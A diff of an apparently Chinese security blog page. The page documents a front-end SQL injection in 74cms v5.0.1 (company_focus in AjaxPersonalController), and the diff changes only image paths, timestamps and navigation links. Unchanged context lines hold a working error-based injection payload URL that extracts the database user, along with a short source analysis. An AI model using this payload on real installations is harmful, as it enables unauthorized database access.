@@ -30,15 +30,15 @@
 <meta property="og:site_name" content="隐秘行动">
 <meta property="og:description" content="74cms v5.0.1 前台sql注入一、漏洞简介74cms 5.0.1 前台AjaxPersonalController.class.php存在SQL注入 二、漏洞影响三、复现过程具体信息文件位置：74cms\upload\Application\Home\Controller\AjaxPersonalController.class.php 方法：function company_focu">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/resource/74cmsv5.0.1%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/media/rId26.png">
-<meta property="og:image" content="http://example.com/resource/74cmsv5.0.1%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/media/rId28.png">
-<meta property="og:image" content="http://example.com/resource/74cmsv5.0.1%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/media/rId29.png">
+<meta property="og:image" content="http://example.com/images/74cmsv5.0.1%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/media/rId26.png">
+<meta property="og:image" content="http://example.com/images/74cmsv5.0.1%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/media/rId28.png">
+<meta property="og:image" content="http://example.com/images/74cmsv5.0.1%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/media/rId29.png">
 <meta property="article:published_time" content="2021-01-12T03:56:11.000Z">
-<meta property="article:modified_time" content="2021-01-12T08:30:06.792Z">
+<meta property="article:modified_time" content="2021-01-12T09:04:11.556Z">
 <meta property="article:author" content="nicaishui">
 <meta property="article:tag" content="74cms">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/resource/74cmsv5.0.1%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/media/rId26.png">
+<meta name="twitter:image" content="http://example.com/images/74cmsv5.0.1%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/media/rId26.png">
 
 
 <link rel="canonical" href="http://example.com/2021/01/12/74cms%20v5.0.1%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/">
@@ -295,7 +295,7 @@
       <span class="post-meta-item-text">发表于</span>
       
 
-      <time title="创建时间：2021-01-12 11:56:11 / 修改时间：16:30:06" itemprop="dateCreated datePublished" datetime="2021-01-12T11:56:11+08:00">2021-01-12</time>
+      <time title="创建时间：2021-01-12 11:56:11 / 修改时间：17:04:11" itemprop="dateCreated datePublished" datetime="2021-01-12T11:56:11+08:00">2021-01-12</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -324,12 +324,12 @@
 <p>是否需登录：需要</p>
 <p>登录权限：普通用户即可</p>
 <h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload:"></a>Payload:</h3><pre><code>http://0-sec.org/74cms/5.0.1/upload/index.php?m=&amp;c=AjaxPersonal&amp;a=company_focus&amp;company_id[0]=match&amp;company_id[1][0]=aaaaaaa%22) and updatexml(1,concat(0x7e,(select user())),0) -- a</code></pre>
-<p><img src="/resource/74cmsv5.0.1%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/media/rId26.png"></p>
+<p><img src="/images/74cmsv5.0.1%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/media/rId26.png"></p>
 <h3 id="源码分析："><a href="#源码分析：" class="headerlink" title="源码分析："></a>源码分析：</h3><p>文件：74cms\upload\Application\Home\Controller\AjaxPersonalController.class.php</p>
 <p>company_focus<br>方法是参数化函数，$company_id参数是不经过I函数过滤的，所以只要where可以控制，那就可以注入</p>
-<p><img src="/resource/74cmsv5.0.1%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/media/rId28.png"></p>
+<p><img src="/images/74cmsv5.0.1%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/media/rId28.png"></p>
 <p>跟踪add_focus(),发现SQL语句参数外部都可以控制，导致了注入漏洞</p>
-<p><img src="/resource/74cmsv5.0.1%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/media/rId29.png"></p>
+<p><img src="/images/74cmsv5.0.1%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/media/rId29.png"></p>
 
     </div>
 
@@ -346,13 +346,13 @@
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/2021/01/12/74cms%20v5.0.1%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81/" rel="prev" title="74cms v5.0.1远程执行代码">
-                  <i class="fa fa-chevron-left"></i> 74cms v5.0.1远程执行代码
+                <a href="/2021/01/12/74cms%20v6.0.4%20%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/" rel="prev" title="74cms v6.0.4 反射型xss">
+                  <i class="fa fa-chevron-left"></i> 74cms v6.0.4 反射型xss
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/2021/01/12/74cms%20v4.2.3%20%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E7%88%86%E7%A0%B4/" rel="next" title="74cms v4.2.3 备份文件爆破">
-                  74cms v4.2.3 备份文件爆破 <i class="fa fa-chevron-right"></i>
+                <a href="/2021/01/12/74cms%20v5.0.1%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81/" rel="next" title="74cms v5.0.1远程执行代码">
+                  74cms v5.0.1远程执行代码 <i class="fa fa-chevron-right"></i>
                 </a>
             </div>
           </div>
